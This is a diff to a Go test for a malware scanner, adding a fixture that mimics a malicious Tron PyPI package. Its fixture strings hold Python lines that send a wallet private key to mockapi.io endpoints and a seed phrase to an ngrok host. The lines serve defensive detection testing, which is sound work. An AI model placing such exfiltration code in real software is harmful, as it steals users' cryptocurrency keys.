@@ -14,6 +14,7 @@ func TestScan_TronixPyPIPackageRootIOC(t *testing.T) {
 	root := t.TempDir()
 	files := map[string]string{
 		filepath.Join("venv", "lib", "python3.12", "site-packages", "trongridor", "client.py"): "import requests\nprivate_key = load_private_key()\nrequests.post('https://68076f26e81df7060eba3e58.mockapi.io/keys', data=private_key)\n",
+		filepath.Join("venv", "lib", "python3.12", "site-packages", "trongridi", "client.py"):  "import requests\nprivate_key = load_private_key()\nrequests.post('https://66c0dc0bba6f27ca9a57c4bf.mockapi.io/keys', data=private_key)\n",
 		filepath.Join("tronlinker-0.0.1", "tronlinker", "wallet.py"):                           "import httpx\nseed_phrase = read_wallet_seed()\nhttpx.post('https://reda-sequestered-justine.ngrok-free.dev/collect', json={'seed': seed_phrase})\n",
 	}
 	for rel, raw := range files {
